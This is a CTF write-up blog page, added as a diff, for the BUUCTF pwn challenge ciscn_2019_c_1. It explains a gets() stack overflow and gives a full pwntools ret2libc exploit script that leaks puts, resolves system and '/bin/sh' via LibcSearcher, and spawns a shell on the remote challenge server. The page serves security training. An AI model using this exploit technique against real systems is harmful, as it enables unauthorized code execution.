@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Ciscn_2019_c_1 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Ciscn_2019_c_1</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/02/08</h2>
+</div>
+
+<main>
+<h1 id="ciscn_2019_c_1">ciscn_2019_c_1</h1>
+<p>查看main()，可以使用的功能只有1</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200209154216312.png" alt="image-20200209154216312"></p>
+<p>进入encrypt()看看伪代码</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200209154312538.png" alt="image-20200209154312538"></p>
+<p>溢出点在gets()，offset = 0x58 + 8 = 88</p>
+<p>思路</p>
+<p>1、通过leak出puts()地址确定libc</p>
+<p>2、计算libc基址、system、/bin/sh地址</p>
+<p>3、getshell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">25695</span>)
+<span style="color:#75715e">#sh = process(&#39;./ciscn_2019_c_1&#39;)</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ciscn_2019_c_1</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+
+<span style="color:#75715e"># start = 0x400B28</span>
+start <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">main</span><span style="color:#e6db74">&#39;</span>]
+rdi_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400c83</span> <span style="color:#75715e">#pop rdi; ret</span>
+<span style="color:#75715e">#由于是64bit系统，因此函数调用的前六个参数是从寄存器中获取的，获取顺序为：</span>
+<span style="color:#75715e">#参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</span>
+<span style="color:#75715e">#所以这里使用通用gadget来传参数</span>
+<span style="color:#75715e">#使用ROPgadget --binary ciscn_2019_en_2 --only &#34;pop|ret&#34;可以查看该gadget</span>
+
+puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+gets_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">gets</span><span style="color:#e6db74">&#39;</span>]
+puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts_plt =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(puts_plt)))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">gets_got =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(gets_got)))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts_got =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(puts_got)))
+
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+
+leak_payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">88</span>
+leak_payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(rdi_addr) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt)
+<span style="color:#75715e">#执行puts(&amp;puts_got)</span>
+leak_payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(start)
+<span style="color:#75715e">#</span>
+
+sh<span style="color:#f92672">.</span>sendline(leak_payload)
+<span style="color:#75715e">#gdb.attach(sh)</span>
+
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">@</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>recvline()
+
+leak_puts_addr <span style="color:#f92672">=</span> u64(sh<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#75715e">#接收puts泄露出的地址</span>
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">leak_puts_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(leak_puts_addr)))
+
+libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>, leak_puts_addr)
+libc_base_addr <span style="color:#f92672">=</span> leak_puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>)
+system_addr <span style="color:#f92672">=</span> libc_base_addr <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>)
+bin_sh_addr <span style="color:#f92672">=</span> libc_base_addr <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">str_bin_sh</span><span style="color:#e6db74">&#39;</span>)
+
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc_base_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(libc_base_addr)))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(system_addr)))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin_sh_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(bin_sh_addr)))
+
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">88</span>
+<span style="color:#75715e">#ret_gadget = 0x4006b9</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4006b9</span>) <span style="color:#75715e"># add ret</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(rdi_addr) <span style="color:#f92672">+</span> p64(bin_sh_addr) <span style="color:#f92672">+</span> p64(system_addr)
+
+sh<span style="color:#f92672">.</span>sendline(payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>坑点：</p>
+<p>1、leak那里用puts不用gets，原因是gets匹配出的结果太多了。</p>
+<p>2、题目环境为ubuntu18，需要加个ret的gadget使栈对齐。</p>
+<p><a href="https://darkwing.moe/2019/11/26/ciscn-2019-c-1/">https://darkwing.moe/2019/11/26/ciscn-2019-c-1/</a></p>
+<p><a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
